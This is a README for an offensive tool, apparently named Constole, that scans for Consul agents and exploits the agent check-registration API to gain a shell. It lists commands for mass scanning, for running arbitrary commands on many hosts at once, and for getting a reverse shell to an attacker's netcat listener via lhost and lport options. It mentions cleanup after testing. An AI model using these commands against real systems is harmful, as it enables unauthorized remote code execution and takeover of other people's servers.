## Overview
Scan for Consul agents and exploit them to gain shell.
I've been messing around with Consul and while reading the API, found the agent registration service.
Registrations feature check functionality, which is typically used to provide health checks on nodes.
A check can be an external application or script, which performs some kind of health check and provides some form of output.
Essentially, this can be any script you define to run at certain time intervals.

### Setup
```
pip install -r requirements.txt
```

### Usage
To scan for hosts running vulnerable Consul agent services, you can provide an comma-separated list with host:port,host:port,...,etc or an input file.
```
python constole.py --targets '10.50.30.1:8500,10.50.30.2:8500'
python constole.py --infile mytargets.txt
```
Remote Code Execution can be achieved across multiple hosts as follows:
```
python constole.py --infile mytargets.txt --cmd 'my command to run'
```
To obtain a reverse shell from the vulnerable host, start a netcat listener on your desired port and select a single target:
python constole.py --targets 10.50.30.1:8500 --lhost my_ip_address --lport my_listening_nc_port
```
Note that Constole will automatically try to deregister the service, after a time period, to assist in clean up during testing.
